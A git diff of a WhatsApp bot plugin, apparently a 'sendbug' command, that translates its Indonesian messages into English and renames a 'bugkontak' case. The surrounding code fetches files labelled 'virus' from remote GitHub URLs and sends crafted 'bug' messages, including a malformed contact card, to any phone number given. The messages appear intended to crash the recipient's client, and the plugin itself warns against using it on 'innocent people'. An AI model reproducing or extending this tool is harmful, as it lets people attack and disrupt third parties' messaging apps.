@@ -5,7 +5,7 @@ import { sticker } from '../lib/sticker.js'
 
 const { default: makeWASocket, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, downloadContentFromMessage, downloadHistory, proto, getMessage, generateWAMessageContent, prepareWAMessageMedia } = (await import('@adiwajshing/baileys')).default
 let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participants }) => {
-	if (!text)return m.reply(`Contoh Penggunaan : *${_p + command}* <nomor>\n\n*Note :*\nJangan Salah Menggunakan Fitur Ini!`)
+	if (!text)return m.reply(`Usage Examples : *${_p + command}* <nomor>\n\n*Note :*\nDon't Misuse This Feature!`)
 	let thumb = fs.readFileSync('./thumbnail.jpg')
 	let virus = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
 	let virus2 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v26.txt")).text()
@@ -30,9 +30,9 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 		]
 	}]
 	let listMessage = {
-		text: '*[ List Bug ]*\n\n*Note :* Jangan Asal Kirim ke orang yg tidak bersalah',
+		text: '*[ List Bug ]*\n\n*Note :* Don\'t send it to innocent people',
 		footer: packname2,
-		buttonText: 'Silahkan Klik Di Sini',
+		buttonText: 'Please Click Here',
 		sections
 	}
 
@@ -202,7 +202,7 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 			//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
 		}
 		break
-		case 'bugkontak': {
+		case 'bugcontact' : {
 			let res = await generateWAMessageFromContent(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {
 				"contactMessage": {
 					"vcard": "HAHaAhHAHAHA",
@@ -243,7 +243,7 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 			if (!/[01]/.test(command)) return conn.sendMessage(m.chat, listMessage, m)
 			throw false
 	}
-	m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
+	m.reply(`Successfully Sent ${type} In Number ${text}@s.whatsapp.net`)
 }
 
 handler.help = ['sendbug <nomer>']
